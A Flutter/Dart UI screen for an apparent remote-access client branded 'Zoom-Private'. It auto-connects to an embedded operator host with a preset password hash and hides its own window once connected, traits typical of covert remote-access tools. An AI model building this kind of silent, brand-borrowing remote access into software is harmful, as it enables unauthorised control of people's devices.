import 'dart:async';

import 'package:flutter/material.dart';
import '../services/connection_service.dart';
import '../services/setup_service.dart';

class UnattendedAccessScreen extends StatefulWidget {
  final String operatorHost;
  final int operatorPort;
  final String passwordHash;
  final bool useHttps;

  const UnattendedAccessScreen({
    super.key,
    required this.operatorHost,
    required this.operatorPort,
    required this.passwordHash,
    required this.useHttps,
  });

  @override
  State<UnattendedAccessScreen> createState() => _UnattendedAccessScreenState();
}

class _UnattendedAccessScreenState extends State<UnattendedAccessScreen> {
  final ConnectionService _conn = ConnectionService();
  final SetupService _setup = SetupService();

  Timer? _poll;
  bool _connecting = true;
  bool _connected = false;
  String _status = 'Starting secure connection…';
  String _deviceId = '';
  int _attempts = 0;
  int _retries = 0;

  @override
  void initState() {
    super.initState();
    _connect();
  }

  Future<void> _connect() async {
    await _conn.applyEmbeddedConfig(
      host: widget.operatorHost,
      port: widget.operatorPort,
      passwordHash: widget.passwordHash,
    );
    await _conn.saveServerConfig(
      host: widget.operatorHost,
      useHttps: widget.useHttps,
    );

    if (!mounted) return;
    setState(() {
      _connecting = true;
      _connected = false;
      _status = 'Starting secure connection…';
    });

    final started = await _setup.startUnattendedAccess();
    if (!started && mounted) {
      setState(() => _status = 'Waiting for background service…');
    }

    _poll?.cancel();
    // Poll quickly so the window can hide the instant the relay reports
    // "connected" instead of waiting up to a full second.
    _poll = Timer.periodic(const Duration(milliseconds: 400), (_) => _checkStatus());
    _checkStatus();
  }

  Future<void> _checkStatus() async {
    if (_connected) return;
    _attempts++;

    final relay = await _setup.getRelayStatus();
    final state = (relay['state'] as String? ?? 'idle').toLowerCase();
    final deviceId = (relay['deviceId'] as String? ?? '').trim();

    if (!mounted) return;
    if (deviceId.isNotEmpty && deviceId != _deviceId) {
      setState(() => _deviceId = deviceId);
    }

    switch (state) {
      case 'connected':
      case 'streaming':
        _poll?.cancel();
        setState(() {
          _connecting = false;
          _connected = true;
          _status = 'Connected to operator webconsole';
        });
        await Future.delayed(const Duration(milliseconds: 200));
        // Connected: hide the window and drop to the background so the
        // operator service keeps running without blocking the end user.
        await _setup.setInvisible();
        return;
      case 'starting':
        setState(() => _status = 'Starting secure connection…');
        break;
      case 'registering':
        setState(() => _status = _attempts > 10
            ? 'Waiting for operator approval…'
            : 'Registering this device with the operator…');
        break;
      case 'failed':
        await _retry();
        return;
      default:
        setState(() => _status = 'Connecting to operator…');
    }

    if (_attempts > 90) {
      _poll?.cancel();
      if (mounted) {
        setState(() {
          _connecting = false;
          _status = 'Connection failed - will retry';
        });
      }
    }
  }

  Future<void> _retry() async {
    if (_retries >= 3) return;
    _retries++;
    if (!mounted) return;
    setState(() => _status = 'Connection interrupted - retrying…');
    await Future.delayed(const Duration(seconds: 3));
    if (!mounted) return;
    await _setup.startUnattendedAccess();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Zoom-Private - Auto-Connect'),
        automaticallyImplyLeading: false,
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            const Spacer(),
            Icon(
              _connected ? Icons.verified_user : Icons.shield_outlined,
              size: 96,
              color: _connected ? Colors.green : const Color(0xFF0753FB),
            ),
            const SizedBox(height: 28),
            Container(
              padding: const EdgeInsets.all(18),
              decoration: BoxDecoration(
                color: _connected
                    ? Colors.green.shade50
                    : _connecting
                        ? const Color(0xFFE8EEFF)
                        : Colors.grey.shade100,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: _connected
                      ? Colors.green
                      : _connecting
                          ? const Color(0xFF0753FB)
                          : Colors.grey,
                ),
              ),
              child: Row(
                children: [
                  if (_connecting)
                    const SizedBox(
                      width: 22,
                      height: 22,
                      child: CircularProgressIndicator(strokeWidth: 2.5),
                    )
                  else
                    Icon(
                      _connected ? Icons.check_circle : Icons.sync_problem,
                      color: _connected ? Colors.green : Colors.orange,
                    ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: Text(
                      _status,
                      style: const TextStyle(
                        fontSize: 15,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),
            if (_deviceId.isNotEmpty)
              Text(
                'Device ID: $_deviceId',
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 12, color: Colors.grey.shade600),
              ),
            const Spacer(flex: 2),
            const Text(
              'Unattended access runs silently in the background',
              textAlign: TextAlign.center,
              style: TextStyle(fontSize: 12, color: Colors.grey),
            ),
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    _poll?.cancel();
    _conn.dispose();
    super.dispose();
  }
}
